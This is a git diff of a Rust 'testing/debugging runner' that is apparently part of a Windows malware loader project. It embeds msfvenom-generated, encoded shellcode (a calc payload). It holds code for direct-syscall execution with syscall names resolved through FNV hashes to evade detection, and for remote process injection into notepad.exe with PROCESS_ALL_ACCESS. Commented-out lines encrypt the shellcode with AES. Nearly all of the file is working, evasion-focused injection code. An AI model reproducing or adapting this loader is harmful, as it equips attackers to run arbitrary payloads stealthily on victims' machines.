@@ -1,27 +1,24 @@
 //! testing/debugging runner binary
 
-use common::crypt;
-use common::crypt::aes::keygen::{AesProtectedKey, ProtectedKey};
+#![no_std]
+extern crate alloc;
+
+mod loader;
+
+use crate::loader::Loader;
+use anyhow::Result;
 use common::hashing::fnv::Fnv;
 use common::hashing::traits::StringHasher;
-use common::remote::thread::Thread;
-use common::syscall::hell::{set_syscall, syscall_1, syscall_11, syscall_3, syscall_5, syscall_6};
-use common::syscall::resolver::SyscallMap;
-use common::util::move_memory;
-use std::ffi::c_void;
-use std::mem::transmute;
-use std::ops::AddAssign;
-use std::ptr::{null, null_mut};
-use std::thread::sleep;
-use std::time::Duration;
-use windows::Win32::Foundation::{GetLastError, FALSE};
+use common::remote::process::Processes;
+use common::util::search_env;
+use core::ffi::c_void;
+use core::ptr::null_mut;
+use windows::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS};
 
-const MEM_RESERVE: u32 = 8192;
-const MEM_COMMIT: u32 = 4096;
-const PAGE_READWRITE: u32 = 0x04;
-const PAGE_EXECUTE_READ: u32 = 0x40;
+const PROCESS_ALL_ACCESS: u32 = 0x1FFFFF;
 
-static SHELLCODE: [u8; 526] = [
+// --- $ msfvenom -p windows/x64/cmd cmd='calc' exitfunc='thread' -e x64/zutto_dekiru -i 5
+const SHELLCODE: [u8; 526] = [
     0x49, 0xbf, 0x89, 0xfc, 0x8b, 0x89, 0x40, 0x7d, 0x4a, 0x16, 0x54, 0x59, 0x4d, 0x31, 0xdb, 0xdb,
     0xdf, 0x41, 0xb3, 0x3c, 0x66, 0x81, 0xe1, 0x80, 0xf4, 0x48, 0x0f, 0xae, 0x01, 0x4c, 0x8b, 0x69,
     0x08, 0x49, 0xff, 0xcb, 0x4f, 0x31, 0x7c, 0xdd, 0x1f, 0x4d, 0x85, 0xdb, 0x75, 0xf3, 0xc4, 0xcd,
@@ -57,207 +54,60 @@ static SHELLCODE: [u8; 526] = [
     0xd5, 0x55, 0xdc, 0xd1, 0x3d, 0xd5, 0xe5, 0x08, 0x14, 0xf6, 0x9a, 0x80, 0xd1, 0x5e,
 ];
 
-fn print_cipher_bytes(cipher: &[u8]) {
-    print!("\n----------\nCIPHER:\n---------\n[");
-    for byte in cipher {
-        print!("0x{:02x?}, ", byte);
-    }
-    print!("]\n");
-}
-
-fn main() -> anyhow::Result<()> {
+fn main() -> Result<()> {
 
     // let mut encryptor = AesProtectedKey::<16>::new()?;
     // let ciphertext = encryptor.encrypt(SHELLCODE.as_slice());
     // println!("key data: {:#02x?}", encryptor);
     // print_cipher_bytes(ciphertext.as_slice());
 
-    // let decryptor = AesProtectedKey::<16>::key_from(
-    //     0x79,
-    //     vec![
-    //         0x8, 0xfb, 0x5c, 0x60, 0x7b, 0x9c, 0x44, 0xfe, 0xc4, 0x2f, 0xc0, 0x8a, 0x1d, 0x5c,
-    //         0xd5, 0x7f,
-    //     ],
-    // )?;
-    // let shellcode = decryptor.decrypt(SHELLCODE_CIPHER.as_slice());
+    // let injection_plain: [&str; 6] = [
+    //     "NtAllocateVirtualMemory",
+    //     "NtProtectVirtualMemory",
+    //     "NtCreateThreadEx",
+    //     "NtWaitForSingleObject",
+    //     "NtClose",
+    //     "NtWriteVirtualMemory",
+    // ]
 
-    remote_injection(SHELLCODE.as_slice())?;
+    let hasher = StringHasher::new(Fnv);
 
-    Ok(())
-}
-
-fn remote_injection(shellcode: &[u8]) -> anyhow::Result<()> {
-    //
-    // currently working hash functions: [ Fnv, Djb, Crc32b ]
-    // ---------------------------------------------------------------
-    // to hash strings, e.g:                                         |
-    // ---------------------------------------------------------------
-    //
-    // use common::hashing::traits::StringHasher;
-    //
-    // let syscalls_plaintext = vec![
-    //     // "NtAllocateVirtualMemory",
-    //     // "NtProtectVirtualMemory",
-    //     // "NtCreateThreadEx",
-    //     // "NtWaitForSingleObject",
-    //     // "NtClose",
-    //     "ntdll.dll",
-    //     "NtQuerySystemInformation",
-    // ];
-
-    // let crc_hasher = StringHasher::new(Fnv);
-    // let mut hashed = crc_hasher.hash(syscalls_plaintext.clone());
-
-    // println!("{:016x?}", hashed);
-    //
-    // ---------------------------------------------------------------
-
-    let mut hashes: Vec<u32> = vec![
-        0x0000002dca3638,
-        0x00000009aecd66,
-        0x00000059a5081a,
-        0x000000d812fb6e,
-        0x000000354d9e65,
+    let hashes: [u32; 6] = [
+        0x0000002dca3638,   // NtAllocateVirtualMemory
+        0x00000009aecd66,   // NtProtectVirtualMemory
+        0x00000059a5081a,   // NtCreateThreadEx
+        0x000000d812fb6e,   // NtWaitForSingleObject
+        0x000000354d9e65,   // NtClose
+        0x00000042b12852,   // NtWriteVirtualMemory
     ];
 
-    let mut table = SyscallMap::new(&mut hashes, Fnv);
-    table.resolve()?;
+    let environment_variables: [&str; 4] = [
+        "Path",
+        "APPDATA",
+        "windir",
+        "NUMBER_",
+    ];
 
-    // --- NtAllocateVirtualMemory --------------------------------------------------------------
-
-    let proc_handle = (!0isize) as *mut c_void;
-    let mut initial_protect = PAGE_READWRITE;
-    let mut base_addr = null_mut::<c_void>();
-    let mut buff_size = shellcode.len();
-    let alloc_type = MEM_RESERVE | MEM_COMMIT;
-
-    let nt_allocate_virtual_memory_args: [u64; 6] = unsafe {
-        [
-            proc_handle as u64,
-            transmute(&mut base_addr),
-            0x0, // zero bits arg
-            transmute(&mut buff_size),
-            alloc_type as u64,
-            initial_protect as u64,
-        ]
-    };
-
-    let mut s = table.syscalls.get(&hashes[0]).unwrap();
-    set_syscall(s.ssn, s.random as u64);
-
-    let mut ntstatus = unsafe { syscall_6(nt_allocate_virtual_memory_args.as_ptr()) };
-
-    if ntstatus != 0x0 {
-        panic!(
-            "[x] failed to allocate: NTSTATUS: {:016x?} | last err: {:?}",
-            ntstatus,
-            unsafe { GetLastError() }
-        );
+    for var in environment_variables {
+        let res = unsafe { search_env(Some(var)) };
+        _ = res;
     }
 
-    unsafe {
-        // replaces `std::ptr::copy` with a custom copy function
-        _ = move_memory(
-            base_addr,
-            shellcode.as_ptr() as *const c_void,
-            shellcode.len(),
-        )
-    };
-
-    // --- NtProtectVirtualMemory --------------------------------------------------------------
-
-    let nt_protect_virtual_memory_args: [u64; 5] = unsafe {
-        [
-            proc_handle as u64,
-            transmute(&mut base_addr),
-            transmute(&mut buff_size),
-            PAGE_EXECUTE_READ as u64,
-            transmute(&mut initial_protect),
-        ]
-    };
-
-    s = table.syscalls.get(&hashes[1]).unwrap();
-    set_syscall(s.ssn, s.random as u64);
-
-    ntstatus = unsafe { syscall_5(nt_protect_virtual_memory_args.as_ptr()) };
-    if ntstatus != 0x0 {
-        panic!(
-            "[x] failed to change: NTSTATUS: {:016x?} | last err: {:?}",
-            ntstatus,
-            unsafe { GetLastError() }
-        );
+    let mut proc_handle: *mut c_void = null_mut();
+    if let Ok(notepad_exe) = Processes::get("notepad.exe") {
+        proc_handle = unsafe {
+            OpenProcess(
+                PROCESS_ACCESS_RIGHTS(PROCESS_ALL_ACCESS),
+                true,
+                notepad_exe.UniqueProcessId.0 as _,
+            )?
+        }.0;
     }
 
-    // --- NtCreateThread ----------------------------------------------------------------------
+    let mut loader = Loader::new(hashes.to_vec(), Some(proc_handle), Fnv);
 
-    let mut thread_handle: *mut c_void = null_mut();
-    let thread_entry: unsafe extern "system" fn(*mut c_void) -> u32 =
-        unsafe { transmute(base_addr) };
+    loader.inject_remote(SHELLCODE.as_slice())?;
+    loader.run_thread(Some(0))?;
 
-    let nt_create_thread_ex_args: [u64; 11] = unsafe {
-        [
-            transmute(&mut thread_handle),
-            0x1FFFFF,
-            null::<c_void>() as u64,
-            proc_handle as u64,
-            thread_entry as u64,
-            null::<c_void>() as u64,
-            FALSE.0 as u64,
-            null::<c_void>() as u64,
-            null::<c_void>() as u64,
-            null::<c_void>() as u64,
-            null::<c_void>() as u64,
-        ]
-    };
-
-    s = table.syscalls.get(&hashes[2]).unwrap();
-    set_syscall(s.ssn, s.random as u64);
-
-    ntstatus = unsafe { syscall_11(nt_create_thread_ex_args.as_ptr()) };
-    if ntstatus != 0x0 {
-        panic!(
-            "[x] failed to run: NTSTATUS: {:016x?} | last err: {:?}",
-            ntstatus,
-            unsafe { GetLastError() }
-        )
-    }
-
-    // --- NtWaitForSingleObject ---------------------------------------------------------------
-
-    let nt_wait_for_single_object_args: [u64; 3] =
-        unsafe { [transmute(thread_handle), 0x10, 0x00] };
-
-    s = table.syscalls.get(&hashes[3]).unwrap();
-    set_syscall(s.ssn, s.random as u64);
-
-    ntstatus = unsafe { syscall_3(nt_wait_for_single_object_args.as_ptr()) };
-    if ntstatus != 0x0 {
-        panic!(
-            "[x] failed to wait: {:016x?} | last err: {:?}",
-            ntstatus,
-            unsafe { GetLastError() }
-        );
-    }
-
-    // --- NtClose ------------------------------------------------------------------------------
-
-    if thread_handle != null_mut() {
-        s = table.syscalls.get(&hashes[4]).unwrap();
-        set_syscall(s.ssn, s.random as u64);
-
-        let ntstatus = unsafe { syscall_1(transmute(thread_handle)) };
-        if ntstatus != 0x0 {
-            println!(
-                "failed to close thread handle (NSTATUS: {:016x?})",
-                ntstatus
-            );
-        }
-    } else {
-        println!("thread handle no longer valid.");
-    }
-
-    // ------------------------------------------------------------------------------------------
-
-    // println!("\n[+] \t- resolved and executed syscalls without issue.\n");
     Ok(())
 }
